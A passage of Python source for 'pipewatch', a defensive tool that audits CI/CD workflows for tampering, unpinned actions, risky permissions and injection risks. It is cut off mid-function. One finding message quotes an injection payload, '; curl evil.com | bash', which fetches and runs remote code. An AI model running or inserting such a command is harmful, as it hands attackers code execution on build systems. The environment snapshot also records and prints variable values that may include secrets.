"""
pipewatch v0.2.0 — CI/CD pipeline integrity monitor

Watches the thing that builds your software.

Usage:
  pipewatch baseline          # record HEAD as known-good
  pipewatch scan              # file diff + step fingerprints vs baseline
  pipewatch pin-audit         # flag unpinned GitHub Actions references
  pipewatch static            # static analysis — no baseline required
  pipewatch snapshot          # capture runner environment to JSON
  pipewatch env-diff <file>   # diff two runner environment snapshots
  pipewatch audit             # full audit: all checks combined
  pipewatch init-runner       # print runner monitoring step block
"""

from __future__ import annotations

import argparse
import difflib
import hashlib
import hmac as _hmac_mod
import json
import os
import re
import shutil
import subprocess
import sys
import urllib.error
import urllib.request
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional

import yaml

__version__ = "0.2.0"

_BASELINE_FILE = ".pipewatch_baseline"
_SNAPSHOT_FILE = ".pipewatch_env_snapshot.json"
_SHA_RE = re.compile(r"^[0-9a-f]{40}$|^[0-9a-f]{64}$", re.IGNORECASE)
_STEP_FIELDS = ("uses", "run", "with", "env", "shell")
_TRACKED_TOOLS = [
    "python3", "python", "node", "npm", "pip", "pip3",
    "git", "curl", "wget", "docker", "kubectl", "terraform", "aws", "gcloud", "az",
]
_IGNORE_VARS: frozenset[str] = frozenset({
    "GITHUB_RUN_ID", "GITHUB_RUN_NUMBER", "GITHUB_SHA", "GITHUB_REF",
    "GITHUB_REF_NAME", "GITHUB_REF_TYPE", "GITHUB_HEAD_REF", "GITHUB_BASE_REF",
    "GITHUB_EVENT_NAME", "GITHUB_ACTOR", "GITHUB_ACTION", "GITHUB_JOB",
    "RUNNER_TEMP", "RUNNER_WORKSPACE", "GITHUB_WORKSPACE",
    "HOME", "TMPDIR", "TMP", "TEMP", "PWD", "_", "TERM", "SHLVL", "OLDPWD",
})
_SEV_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
_ANSI = {
    "HIGH": "\033[91m", "CRITICAL": "\033[91m", "MEDIUM": "\033[93m",
    "LOW": "\033[94m", "INFO": "\033[0m", "RESET": "\033[0m",
}

# Static analysis patterns
_DANGEROUS_CTX = re.compile(
    r"\$\{\{[^}]*("
    r"github\.event\.pull_request\.(title|body|head\.ref|head\.label)"
    r"|github\.event\.issue\.(title|body)"
    r"|github\.event\.comment\.body"
    r"|github\.event\.discussion\.(title|body)"
    r"|github\.event\.review\.body"
    r"|github\.event\.review_comment\.body"
    r"|github\.head_ref"
    r")[^}]*\}\}",
    re.IGNORECASE,
)
_GH_HOSTED = re.compile(r"^(ubuntu|windows|macos)", re.IGNORECASE)
_UNSAFE_TRIGGERS = frozenset({
    "pull_request", "issues", "issue_comment",
    "pull_request_review", "pull_request_review_comment",
})
_GITLAB_RESERVED = frozenset({
    "stages", "variables", "include", "default", "workflow",
    "image", "services", "before_script", "after_script", "cache", "artifacts",
})

# Jenkinsfile patterns (best-effort — Groovy DSL has no Python parser)
_JENKINS_STAGE = re.compile(r"stage\s*\(\s*['\"]([^'\"]+)['\"]\s*\)")
_JENKINS_SH = re.compile(
    r"\b(?:sh|bat)\s+(?:script:\s*)?(?:'''(.*?)'''|\"\"\"(.*?)\"\"\"|'([^']*)'|\"([^\"]*)\")",
    re.DOTALL,
)


# ── pipeline file discovery ───────────────────────────────────────────────────

def find_pipeline_files(repo: Path) -> list[Path]:
    found = []
    for subdir, pat in [(".github/workflows", "*.yml"), (".github/workflows", "*.yaml")]:
        base = repo / subdir
        if base.exists():
            found.extend(base.glob(pat))
    for name in ("Jenkinsfile", ".gitlab-ci.yml", ".gitlab-ci.yaml"):
        p = repo / name
        if p.exists():
            found.append(p)
    return found


def _is_pipeline_path(path: str) -> bool:
    p = Path(path)
    if p.name in ("Jenkinsfile", ".gitlab-ci.yml", ".gitlab-ci.yaml"):
        return True
    return (len(p.parts) >= 3 and p.parts[0] == ".github"
            and p.parts[1] == "workflows" and p.suffix in (".yml", ".yaml"))


# ── git helpers ───────────────────────────────────────────────────────────────

def git_show(repo: Path, commit: str, path: str) -> Optional[str]:
    r = subprocess.run(["git", "show", f"{commit}:{path}"],
                       cwd=repo, capture_output=True, text=True)
    return r.stdout if r.returncode == 0 else None


def git_head(repo: Path) -> str:
    r = subprocess.run(["git", "rev-parse", "HEAD"],
                       cwd=repo, capture_output=True, text=True)
    sha = r.stdout.strip()
    if not sha:
        sys.exit("error: could not determine HEAD commit")
    return sha


def git_deleted_pipeline_files(repo: Path, commit: str) -> list[str]:
    r = subprocess.run(
        ["git", "diff", "--name-status", commit, "HEAD", "--diff-filter=D"],
        cwd=repo, capture_output=True, text=True)
    return [line.split("\t", 1)[1] for line in r.stdout.splitlines()
            if "\t" in line and _is_pipeline_path(line.split("\t", 1)[1])]


# ── differ ────────────────────────────────────────────────────────────────────

@dataclass
class FileDiff:
    path: str
    status: str
    diff_lines: list[str] = field(default_factory=list)
    baseline_commit: Optional[str] = None


def diff_pipeline_files(repo: Path, baseline: str) -> list[FileDiff]:
    results = []
    for fpath in find_pipeline_files(repo):
        rel = str(fpath.relative_to(repo))
        current = fpath.read_text(encoding="utf-8")
        base = git_show(repo, baseline, rel)
        if base is None:
            results.append(FileDiff(rel, "added", list(difflib.unified_diff(
                [], current.splitlines(keepends=True),
                fromfile=f"{rel} (not in baseline)", tofile=f"{rel} (current)")),
                baseline))
        elif base != current:
            results.append(FileDiff(rel, "modified", list(difflib.unified_diff(
                base.splitlines(keepends=True), current.splitlines(keepends=True),
                fromfile=f"{rel} @ {baseline}", tofile=f"{rel} (current)")),
                baseline))
    for path in git_deleted_pipeline_files(repo, baseline):
        results.append(FileDiff(path, "deleted", baseline_commit=baseline))
    return results


# ── step fingerprinting ───────────────────────────────────────────────────────

def hash_step(step: dict) -> str:
    """Hash the security-relevant fields of a GitHub Actions step."""
    canon = json.dumps({k: step[k] for k in _STEP_FIELDS if k in step}, sort_keys=True)
    return hashlib.sha256(canon.encode()).hexdigest()[:16]


def _hash_content(content) -> str:
    """Hash arbitrary content (for GitLab CI / Jenkinsfile where field names vary)."""
    return hashlib.sha256(json.dumps(content, sort_keys=True).encode()).hexdigest()[:16]


def _fingerprints(workflow_path: str, content: str) -> dict[tuple[str, int], tuple[Optional[str], str]]:
    """GitHub Actions: {(job, step_index): (step_name, fingerprint)}"""
    try:
        doc = yaml.safe_load(content)
    except yaml.YAMLError:
        return {}
    if not isinstance(doc, dict):
        return {}
    out = {}
    for job, job_def in (doc.get("jobs") or {}).items():
        if not isinstance(job_def, dict):
            continue
        for idx, step in enumerate(job_def.get("steps") or []):
            if isinstance(step, dict):
                out[(str(job), idx)] = (step.get("name"), hash_step(step))
    return out


def _fingerprints_gitlab(content: str) -> dict[tuple[str, int], tuple[Optional[str], str]]:
    """GitLab CI: top-level jobs, fingerprint before_script/script/after_script blocks."""
    try:
        doc = yaml.safe_load(content)
    except yaml.YAMLError:
        return {}
    if not isinstance(doc, dict):
        return {}
    out = {}
    for job_name, job_def in doc.items():
        if job_name.startswith(".") or job_name in _GITLAB_RESERVED:
            continue
        if not isinstance(job_def, dict):
            continue
        for idx, block_name in enumerate(("before_script", "script", "after_script")):
            if block_name in job_def:
                out[(str(job_name), idx)] = (
                    block_name,
                    _hash_content(job_def[block_name]),
                )
    return out


def _fingerprints_jenkinsfile(content: str) -> dict[tuple[str, int], tuple[Optional[str], str]]:
    """Jenkinsfile: best-effort regex extraction of stage/sh/bat blocks."""
    out = {}
    stages = list(_JENKINS_STAGE.finditer(content))
    for i, stage_match in enumerate(stages):
        stage_name = stage_match.group(1)
        start = stage_match.start()
        end = stages[i + 1].start() if i + 1 < len(stages) else len(content)
        chunk = content[start:end]
        commands = []
        for m in _JENKINS_SH.finditer(chunk):
            cmd = next((g for g in m.groups() if g is not None), "")
            commands.append(cmd.strip())
        out[(stage_name, 0)] = (stage_name, _hash_content({"run": commands, "stage": stage_name}))
    return out


@dataclass
class StepChange:
    path: str
    job: str
    step_index: int
    step_name: Optional[str]
    baseline_fp: Optional[str]
    current_fp: Optional[str]
    status: str


def _fps_for_file(fpath: Path, rel: str, content: str) -> dict:
    if fpath.name == "Jenkinsfile":
        return _fingerprints_jenkinsfile(content)
    if fpath.name in (".gitlab-ci.yml", ".gitlab-ci.yaml"):
        return _fingerprints_gitlab(content)
    return _fingerprints(rel, content)


def diff_fingerprints(repo: Path, baseline: str) -> list[StepChange]:
    changes = []
    for fpath in find_pipeline_files(repo):
        rel = str(fpath.relative_to(repo))
        current_content = fpath.read_text(encoding="utf-8")
        base_content = git_show(repo, baseline, rel)
        cur = _fps_for_file(fpath, rel, current_content)
        bas = _fps_for_file(fpath, rel, base_content) if base_content else {}
        for key in sorted(set(cur) | set(bas)):
            c, b = cur.get(key), bas.get(key)
            if b is None:
                changes.append(StepChange(rel, key[0], key[1], c[0] if c else None,
                                          None, c[1] if c else None, "added"))
            elif c is None:
                changes.append(StepChange(rel, key[0], key[1], b[0], b[1], None, "removed"))
            elif c[1] != b[1]:
                changes.append(StepChange(rel, key[0], key[1], c[0], b[1], c[1], "modified"))
    return changes


# ── static analysis ───────────────────────────────────────────────────────────

def _load_workflow_docs(repo: Path) -> dict[str, dict]:
    """Load all GitHub Actions workflow files → {rel_path: parsed_doc}"""
    docs = {}
    wf_dir = repo / ".github" / "workflows"
    if not wf_dir.exists():
        return docs
    for fpath in list(wf_dir.glob("*.yml")) + list(wf_dir.glob("*.yaml")):
        rel = str(fpath.relative_to(repo))
        if rel in docs:
            continue
        try:
            doc = yaml.safe_load(fpath.read_text(encoding="utf-8"))
            if isinstance(doc, dict):
                docs[rel] = doc
        except (yaml.YAMLError, OSError):
            continue
    return docs


def _get_triggers(doc: dict) -> dict:
    """Parse `on:` block — PyYAML parses the bare `on` key as boolean True."""
    on = doc.get("on") or doc.get(True) or {}
    if isinstance(on, str):
        return {on: {}}
    if isinstance(on, list):
        return {t: {} for t in on}
    return on if isinstance(on, dict) else {}


def _check_pr_target_misuse(docs: dict[str, dict]) -> list[dict]:
    """Flag pull_request_target workflows that check out and execute PR head code."""
    findings = []
    checkout_re = re.compile(r"actions/checkout(@.*)?")
    pr_head_re = re.compile(r"github\.event\.pull_request\.head|github\.head_ref", re.IGNORECASE)
    for path, doc in docs.items():
        if "pull_request_target" not in _get_triggers(doc):
            continue
        for job_name, job_def in (doc.get("jobs") or {}).items():
            if not isinstance(job_def, dict):
                continue
            for idx, step in enumerate(job_def.get("steps") or []):
                if not isinstance(step, dict):
                    continue
                if not checkout_re.match(step.get("uses", "")):
                    continue
                with_block = json.dumps(step.get("with") or {})
                if pr_head_re.search(with_block):
                    findings.append(_finding(
                        f"PW-PRT-{len(findings)+1:03d}", "HIGH",
                        "pull_request_target_misuse",
                        f"pull_request_target checks out PR head: {path}::{job_name}::step[{idx}]",
                        "pull_request_target runs with write permissions against the base branch. "
                        "Checking out and executing PR head code hands arbitrary code execution to "
                        "the PR author — this is the pattern behind numerous CI poisoning attacks.",
                        f"{path}::{job_name}::step[{idx}]",
                        f"uses={step.get('uses')}  with={with_block[:120]}",
                    ))
    return findings


def _check_script_injection(docs: dict[str, dict]) -> list[dict]:
    """Flag run: blocks interpolating untrusted user-controlled context values."""
    findings = []
    for path, doc in docs.items():
        for job_name, job_def in (doc.get("jobs") or {}).items():
            if not isinstance(job_def, dict):
                continue
            for idx, step in enumerate(job_def.get("steps") or []):
                if not isinstance(step, dict) or "run" not in step:
                    continue
                run_block = str(step["run"])
                matches = _DANGEROUS_CTX.findall(run_block)
                if matches:
                    findings.append(_finding(
                        f"PW-INJ-{len(findings)+1:03d}", "HIGH",
                        "script_injection",
                        f"Script injection risk: {path}::{job_name}::step[{idx}]",
                        "A run: block interpolates a user-controlled context value directly into "
                        "a shell command. An attacker can craft a PR title, issue body, or branch "
                        "name containing `; curl evil.com | bash` to execute arbitrary code.",
                        f"{path}::{job_name}::step[{idx}]",
                        f"dangerous expressions found: {sorted(set(m[0] if isinstance(m, tuple) else m for m in matches))}",
                    ))
    return findings


def _check_permissions(docs: dict[str, dict]) -> list[dict]:
    """Audit top-level and per-job permissions blocks."""
    findings = []
    for path, doc in docs.items():
        top_perms = doc.get("permissions")
        if top_perms is None:
            findings.append(_finding(
                f"PW-PERM-{len(findings)+1:03d}", "MEDIUM",
                "permissions",
                f"No permissions block: {path}",
                "Without an explicit permissions block the workflow inherits the repository's "
                "default — which may grant write access to all scopes. "
                "Declare the minimum required permissions explicitly.",
                path,
                "add: permissions: read-all  (or scope each permission individually)",
            ))
        elif top_perms == "write-all":
            findings.append(_finding(
                f"PW-PERM-{len(findings)+1:03d}", "HIGH",
                "permissions",
                f"permissions: write-all in {path}",
                "write-all grants write access to every scope. "
                "Scope permissions to the minimum each job actually needs.",
                path,
            ))
        for job_name, job_def in (doc.get("jobs") or {}).items():
            if not isinstance(job_def, dict):
                continue
            if job_def.get("permissions") == "write-all":
                findings.append(_finding(
                    f"PW-PERM-{len(findings)+1:03d}", "HIGH",
                    "permissions",
                    f"Job permissions: write-all in {path}::{job_name}",
                    f"Job '{job_name}' has permissions: write-all.",
                    f"{path}::{job_name}",
                ))
            if job_def.get("secrets") == "inherit":
                findings.append(_finding(
                    f"PW-PERM-{len(findings)+1:03d}", "MEDIUM",
                    "permissions",
                    f"secrets: inherit in {path}::{job_name}",
                    f"Job '{job_name}' passes all secrets to a called workflow. "
                    "Pass only the specific secrets each called workflow needs.",
                    f"{path}::{job_name}",
                ))
    return findings


def _check_self_hosted(docs: dict[str, dict]) -> list[dict]:
    """Flag jobs running on self-hosted runners."""
    findings = []
    for path, doc in docs.items():
        for job_name, job_def in (doc.get("jobs") or {}).items():
            if not isinstance(job_def, dict):
                continue
            runs_on = job_def.get("runs-on", "")
            is_self_hosted = False
            if isinstance(runs_on, list):
                is_self_hosted = "self-hosted" in runs_on or any(
                    not _GH_HOSTED.match(str(r)) for r in runs_on if isinstance(r, str)
                )
            elif isinstance(runs_on, str) and runs_on:
                is_self_hosted = not _GH_HOSTED.match(runs_on)
            if is_self_hosted:
                findings.append(_finding(
                    f"PW-RUNNER-{len(findings)+1:03d}", "INFO",
                    "self_hosted_runner",
                    f"Self-hosted runner: {path}::{job_name}",
                    f"Job '{job_name}' runs on '{runs_on}'. Self-hosted runners are not ephemeral, "
                    "not managed by GitHub, and may persist state between runs. "
                    "All other findings in this job carry elevated risk.",
                    f"{path}::{job_name}",
                    f"runs-on: {runs_on}",
                ))
    return findings


def _check_workflow_run_chains(docs: dict[str, dict]) -> list[dict]:
    """Flag workflow_run triggers that chain write-permissioned workflows to unsafe sources."""
    findings = []
    # Map workflow name (or filename stem) → set of trigger names
    name_to_triggers: dict[str, set[str]] = {}
    for path, doc in docs.items():
        triggers = set(_get_triggers(doc).keys())
        name = doc.get("name") or Path(path).stem
        name_to_triggers[name] = triggers
        name_to_triggers[path] = triggers  # also index by path

    for path, doc in docs.items():
        triggers = _get_triggers(doc)
        if "workflow_run" not in triggers:
            continue
        wr_config = triggers.get("workflow_run") or {}
        triggered_by = wr_config.get("workflows", []) if isinstance(wr_config, dict) else []

        top_perms = doc.get("permissions")
        has_write = (
            top_perms == "write-all"
            or (isinstance(top_perms, dict)
                and any(v in ("write", "admin") for v in top_perms.values()))
        )

        for source_name in triggered_by:
            source_triggers = name_to_triggers.get(source_name, set())
            unsafe = source_triggers & _UNSAFE_TRIGGERS
            if unsafe and has_write:
                findings.append(_finding(
                    f"PW-CHAIN-{len(findings)+1:03d}", "HIGH",
                    "workflow_run_chain",
                    f"Unsafe workflow_run chain: {path}",
                    f"'{path}' runs on workflow_run triggered by '{source_name}', "
                    f"which responds to {sorted(unsafe)}. "
                    "This workflow has write permissions, creating a privilege escalation path: "
                    "a PR from an untrusted fork can indirectly trigger write-permissioned code.",
                    path,
                    f"source={source_name}  source_triggers={sorted(unsafe)}",
                ))
    return findings


def static_analysis(repo: Path) -> list[dict]:
    """Run all static checks that don't require a baseline commit."""
    docs = _load_workflow_docs(repo)
    return (
        _check_pr_target_misuse(docs)
        + _check_script_injection(docs)
        + _check_permissions(docs)
        + _check_self_hosted(docs)
        + _check_workflow_run_chains(docs)
    )


# ── pinning audit ─────────────────────────────────────────────────────────────

@dataclass
class PinningFinding:
    path: str
    job: str
    step_index: int
    step_name: Optional[str]
    uses_ref: str
    recommendation: str


def _is_sha_pinned(ref: str) -> bool:
    _, _, pin = ref.rpartition("@")
    return bool(_SHA_RE.match(pin))


def audit_pinning(repo: Path) -> list[PinningFinding]:
    findings = []
    for fpath in find_pipeline_files(repo):
        if fpath.suffix not in (".yml", ".yaml"):
            continue
        rel = str(fpath.relative_to(repo))
        try:
            doc = yaml.safe_load(fpath.read_text(encoding="utf-8"))
        except (yaml.YAMLError, OSError):
            continue
        if not isinstance(doc, dict):
            continue
        for job, job_def in (doc.get("jobs") or {}).items():
            if not isinstance(job_def, dict):
                continue
            for idx, step in enumerate(job_def.get("steps") or []):
                if not isinstance(step, dict) or "uses" not in step:
                    continue
                ref: str = step["uses"]
                if ref.startswith("./") or ("@" in ref and _is_sha_pinned(ref)):
                    continue
                action = ref.split("@")[0] if "@" in ref else ref
                tag = ref.split("@")[1] if "@" in ref else "unversioned"
                findings.append(PinningFinding(
                    rel, str(job), idx, step.get("name"), ref,
                    f"uses: {action}@<sha>  # {tag}\n"
                    f"  https://github.com/{action}/commits",
                ))
    return findings


def _verify_commit_exists(owner: str, repo_name: str, sha: str, token: Optional[str]) -> bool:
    """Return False only if GitHub's API returns 404 for this commit."""
    url = f"https://api.github.com/repos/{owner}/{repo_name}/git/commits/{sha}"
    headers = {
        "Accept": "application/vnd.github.v3+json",
        "User-Agent": f"pipewatch/{__version__}",
    }
    if token:
        headers["Authorization"] = f"Bearer {token}"
    try:
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status == 200
    except urllib.error.HTTPError as e:
        return e.code != 404
    except Exception:
        return True  # network unavailable — don't raise false positives


def verify_pinned_shas(repo: Path, token: Optional[str] = None) -> list[dict]:
    """
    For each SHA-pinned action, verify the commit exists in that repo via GitHub API.
    Opt-in: pass --verify-shas. Rate limit: 60 req/hr unauthenticated, 5000 with --token.
    """
    findings = []
    seen: set[tuple[str, str]] = set()

    for fpath in find_pipeline_files(repo):
        if fpath.suffix not in (".yml", ".yaml"):
            continue
        try:
            doc = yaml.safe_load(fpath.read_text(encoding="utf-8"))
        except (yaml.YAMLError, OSError):
            continue
        if not isinstance(doc, dict):
            continue

        rel = str(fpath.relative_to(repo))
        for job, job_def in (doc.get("jobs") or {}).items():
            if not isinstance(job_def, dict):
                continue
            for idx, step in enumerate(job_def.get("steps") or []):
                if not isinstance(step, dict) or "uses" not in step:
                    continue
                ref: str = step["uses"]
                if ref.startswith("./") or "@" not in ref or not _is_sha_pinned(ref):
                    continue
                action, _, sha = ref.rpartition("@")
                parts = action.split("/")
                if len(parts) < 2:
                    continue
                owner, repo_name = parts[0], parts[1]
                key = (f"{owner}/{repo_name}", sha)
                if key in seen:
                    continue
                seen.add(key)
                if not _verify_commit_exists(owner, repo_name, sha, token):
                    findings.append(_finding(
                        f"PW-SHA-{len(findings)+1:03d}", "HIGH",
                        "invalid_pinned_sha",
                        f"Pinned SHA not found in repo: {ref}",
                        f"Commit {sha[:8]}... does not exist in {owner}/{repo_name}. "
                        "This may be a typo, a SHA from a fork, or a deleted commit.",
                        f"{rel}::{job}::step[{idx}]",
                        f"checked: GET /repos/{owner}/{repo_name}/git/commits/{sha}",
                    ))
    return findings


# ── runner environment ────────────────────────────────────────────────────────

@dataclass
class EnvSnapshot:
    timestamp: str
    environment: dict[str, str]
    tool_versions: dict[str, Optional[str]]


@dataclass
class EnvDiff:
    new_vars: dict[str, str] = field(default_factory=dict)
    removed_vars: list[str] = field(default_factory=list)
    changed_vars: dict[str, tuple[str, str]] = field(default_factory=dict)
    new_tools: list[str] = field(default_factory=list)
    removed_tools: list[str] = field(default_factory=list)
    changed_tool_versions: dict[str, tuple[Optional[str], Optional[str]]] = field(default_factory=dict)

    def is_empty(self) -> bool:
        return not any([self.new_vars, self.removed_vars, self.changed_vars,
                        self.new_tools, self.removed_tools, self.changed_tool_versions])


def _tool_version(tool: str) -> Optional[str]:
    if not shutil.which(tool):
        return None
    try:
        r = subprocess.run([tool, "--version"], capture_output=True, text=True, timeout=5)
        return (r.stdout or r.stderr or "").splitlines()[0].strip()[:120]
    except Exception:
        return "(present — version unavailable)"


def capture_snapshot() -> EnvSnapshot:
    return EnvSnapshot(
        timestamp=datetime.now(timezone.utc).isoformat(),
        environment={k: v for k, v in os.environ.items() if k not in _IGNORE_VARS},
        tool_versions={t: _tool_version(t) for t in _TRACKED_TOOLS},
    )


def save_snapshot(snap: EnvSnapshot, path: Path) -> None:
    path.write_text(json.dumps({"timestamp": snap.timestamp,
                                "environment": snap.environment,
                                "tool_versions": snap.tool_versions}, indent=2))


def load_snapshot(path: Path) -> EnvSnapshot:
    d = json.loads(path.read_text())
    return EnvSnapshot(d["timestamp"], d["environment"], d["tool_versions"])


def diff_snapshots(base: EnvSnapshot, cur: EnvSnapshot) -> EnvDiff:
    diff = EnvDiff()
    for k, v in cur.environment.items():
        if k not in base.environment:
            diff.new_vars[k] = v
        elif base.environment[k] != v:
            diff.changed_vars[k] = (base.environment[k], v)
    diff.removed_vars = [k for k in base.environment if k not in cur.environment]
    for tool in _TRACKED_TOOLS:
        old, new = base.tool_versions.get(tool), cur.tool_versions.get(tool)
        if old is None and new is not None:
            diff.new_tools.append(tool)
        elif old is not None and new is None:
            diff.removed_tools.append(tool)
        elif old != new and old is not None:
            diff.changed_tool_versions[tool] = (old, new)
    return diff


# ── tamper-evident baseline ───────────────────────────────────────────────────

def _hmac_sign(commit: str, key: str) -> str:
    return _hmac_mod.new(key.encode(), commit.encode(), hashlib.sha256).hexdigest()


def _hmac_verify(commit: str, signature: str, key: str) -> bool:
    return _hmac_mod.compare_digest(_hmac_sign(commit, key), signature)


def save_baseline(repo: Path, commit: str) -> None:
    key = os.environ.get("PIPEWATCH_HMAC_KEY")
    if key:
        data = {
            "commit": commit,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "hmac": _hmac_sign(commit, key),
        }
        (repo / _BASELINE_FILE).write_text(json.dumps(data) + "\n", encoding="utf-8")
    else:
        (repo / _BASELINE_FILE).write_text(commit + "\n", encoding="utf-8")


def load_baseline(repo: Path, override: Optional[str]) -> str:
    if override:
        return override
    bf = repo / _BASELINE_FILE
    if not bf.exists():
        sys.exit("error: no baseline set. Run `pipewatch baseline` first.")
    content = bf.read_text().strip()
    try:
        data = json.loads(content)
        commit = data["commit"]
        key = os.environ.get("PIPEWATCH_HMAC_KEY")
        if key and not _hmac_verify(commit, data.get("hmac", ""), key):
            sys.exit(
                "error: baseline HMAC verification failed — "
                "the baseline file may have been tampered with."
            )
        return commit
    except (json.JSONDecodeError, KeyError):
        return content  # plain text format (backward compat)


# ── report ────────────────────────────────────────────────────────────────────

def _finding(fid, severity, category, title, description, location, evidence=""):
    return {"id": fid, "severity": severity, "category": category,
            "title": title, "description": description,
            "location": location, "evidence": evidence}


def _findings_from_diffs(diffs: list[FileDiff]) -> list[dict]:
    return [_finding(
        f"PW-DIFF-{i:03d}",
        "HIGH" if d.status in ("modified", "deleted") else "MEDIUM",
        "pipeline_file_change",
        f"Pipeline file {d.status}: {d.path}",
        f"'{d.path}' was {d.status} since baseline {d.baseline_commit}.",
        d.path, "".join(d.diff_lines[:50]),
    ) for i, d in enumerate(diffs, 1)]


def _findings_from_steps(changes: list[StepChange]) -> list[dict]:
    out = []
    for i, c in enumerate(changes, 1):
        loc = f"{c.path}::{c.job}::step[{c.step_index}]"
        if c.status == "modified":
            out.append(_finding(f"PW-STEP-{i:03d}", "HIGH", "step_fingerprint",
                f"Step fingerprint changed: {loc}",
                f"Step {c.step_index} in '{c.job}' changed — possible injected command or swapped action.",
                loc, f"baseline={c.baseline_fp}  current={c.current_fp}"))
        elif c.status == "added":
            out.append(_finding(f"PW-STEP-{i:03d}", "HIGH", "step_fingerprint",
                f"New step injected: {loc}",
                f"Step {c.step_index} in '{c.job}' of '{c.path}' did not exist at baseline.",
                loc, f"fingerprint={c.current_fp}"))
        else:
            out.append(_finding(f"PW-STEP-{i:03d}", "MEDIUM", "step_fingerprint",
                f"Step removed: {loc}",
                f"Step {c.step_index} in '{c.job}' of '{c.path}' was removed since baseline.",
                loc, f"baseline_fp={c.baseline_fp}"))
    return out


def _findings_from_pinning(pinning: list[PinningFinding]) -> list[dict]:
    return [_finding(
        f"PW-PIN-{i:03d}", "MEDIUM", "unpinned_dependency",
        f"Unpinned action: {p.uses_ref}",
        f"Step {p.step_index} in '{p.job}' of '{p.path}' uses '{p.uses_ref}', "
        "not pinned to a commit SHA — mutable tags can be silently overwritten.",
        f"{p.path}::{p.job}::step[{p.step_index}]", p.recommendation,
    ) for i, p in enumerate(pinning, 1)]


def _findings_from_env(diff: EnvDiff) -> list[dict]:
    out, i = [], 1
    for var, val in diff.new_vars.items():
        out.append(_finding(f"PW-ENV-{i:03d}", "MEDIUM", "runner_environment",
            f"New environment variable: {var}",
            f"'{var}' present now but absent at baseline.",
            "runner", f"{var}={val[:80]}")); i += 1
    for var in diff.removed_vars:
        out.append(_finding(f"PW-ENV-{i:03d}", "LOW", "runner_environment",
            f"Environment variable removed: {var}", f"'{var}' absent now, present at baseline.",
            "runner")); i += 1
    for var, (old, new) in diff.changed_vars.items():
        out.append(_finding(f"PW-ENV-{i:03d}", "MEDIUM", "runner_environment",
            f"Environment variable changed: {var}",
            f"'{var}' changed — PATH changes can redirect tool execution.",
            "runner", f"baseline='{old[:60]}'  current='{new[:60]}'")); i += 1
    for tool in diff.new_tools:
        out.append(_finding(f"PW-ENV-{i:03d}", "LOW", "runner_environment",
            f"New tool present: {tool}", f"'{tool}' installed now, absent at baseline.",
            "runner")); i += 1
    for tool in diff.removed_tools:
        out.append(_finding(f"PW-ENV-{i:03d}", "LOW", "runner_environment",
            f"Tool removed: {tool}", f"'{tool}' absent now, present at baseline.",
            "runner")); i += 1
    for tool, (old, new) in diff.changed_tool_versions.items():
        out.append(_finding(f"PW-ENV-{i:03d}", "LOW", "runner_environment",
            f"Tool version changed: {tool}", f"'{tool}' changed version between runs.",
            "runner", f"baseline='{old}'  current='{new}'")); i += 1
    return out


def build_report(findings: list[dict], repo: str, baseline: Optional[str]) -> dict:
    counts = {s: 0 for s in _SEV_ORDER}
    for f in findings:
        counts[f["severity"]] = counts.get(f["severity"], 0) + 1
    return {
        "tool": "pipewatch", "version": __version__,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "repo": str(repo), "baseline_commit": baseline,
        "findings": sorted(findings, key=lambda x: _SEV_ORDER.get(x["severity"], 99)),
        "summary": {"total": len(findings), **counts},
    }


def print_report(report: dict, verbose: bool = False) -> None:
    print(f"\npipewatch {report['version']}  {report['timestamp']}")
    print(f"repo:     {report['repo']}")
    if report.get("baseline_commit"):
        print(f"baseline: {report['baseline_commit']}")
    print()
    if not report["findings"]:
        print("✓  No findings.\n")
        return
    for f in report["findings"]:
        sev = f["severity"]
        print(f"{_ANSI.get(sev, '')}[{sev}]{_ANSI['RESET']}  {f['id']}  {f['title']}")
        if verbose:
            print(f"         {f['description']}")
            if f.get("evidence"):
                print(f"         evidence: {f['evidence'][:120]}")
        print()
    s = report["summary"]
    print("─" * 60)
    print(f"total={s['total']}  HIGH={s['HIGH']}  MEDIUM={s['MEDIUM']}  LOW={s['LOW']}\n")


# ── CLI ───────────────────────────────────────────────────────────────────────

def _repo(path: str) -> Path:
    p = Path(path).resolve()
    if not (p / ".git").exists():
        sys.exit(f"error: {p} is not a git repository")
    return p


def _emit(report: dict, as_json: bool, verbose: bool) -> None:
    print(json.dumps(report, indent=2)) if as_json else print_report(report, verbose)


def cmd_baseline(args):
    repo = _repo(args.repo)
    commit = args.commit or git_head(repo)
    save_baseline(repo, commit)
    signed = bool(os.environ.get("PIPEWATCH_HMAC_KEY"))
    suffix = " (HMAC-signed)" if signed else " (unsigned — set PIPEWATCH_HMAC_KEY to enable signing)"
    print(f"baseline → {commit}{suffix}")


def cmd_scan(args):
    repo = _repo(args.repo)
    commit = load_baseline(repo, args.baseline)
    findings = (_findings_from_diffs(diff_pipeline_files(repo, commit))
                + _findings_from_steps(diff_fingerprints(repo, commit)))
    _emit(build_report(findings, repo, commit), args.json, args.verbose)
    sys.exit(1 if findings else 0)


def cmd_pin_audit(args):
    repo = _repo(args.repo)
    findings = _findings_from_pinning(audit_pinning(repo))
    if args.verify_shas:
        findings += verify_pinned_shas(repo, args.token or os.environ.get("GITHUB_TOKEN"))
    _emit(build_report(findings, repo, None), args.json, args.verbose)
    sys.exit(1 if findings else 0)


def cmd_static(args):
    repo = _repo(args.repo)
    findings = static_analysis(repo)
    _emit(build_report(findings, repo, None), args.json, args.verbose)
    sys.exit(1 if findings else 0)


def cmd_snapshot(args):
    snap = capture_snapshot()
    save_snapshot(snap, Path(args.output))
    print(f"snapshot → {args.output}")


def cmd_env_diff(args):
    base_snap = load_snapshot(Path(args.baseline_snapshot))
    cur_snap = load_snapshot(Path(args.current_snapshot)) if args.current_snapshot else capture_snapshot()
    findings = _findings_from_env(diff_snapshots(base_snap, cur_snap))
    _emit(build_report(findings, args.repo or ".", None), args.json, args.verbose)
    sys.exit(1 if findings else 0)


def cmd_audit(args):
    """Full audit: scan + pin-audit + static analysis."""
    repo = _repo(args.repo)
    commit = load_baseline(repo, args.baseline)
    findings = (
        _findings_from_diffs(diff_pipeline_files(repo, commit))
        + _findings_from_steps(diff_fingerprints(repo, commit))
        + _findings_from_pinning(audit_pinning(repo))
        + static_analysis(repo)
    )
    if args.verify_shas:
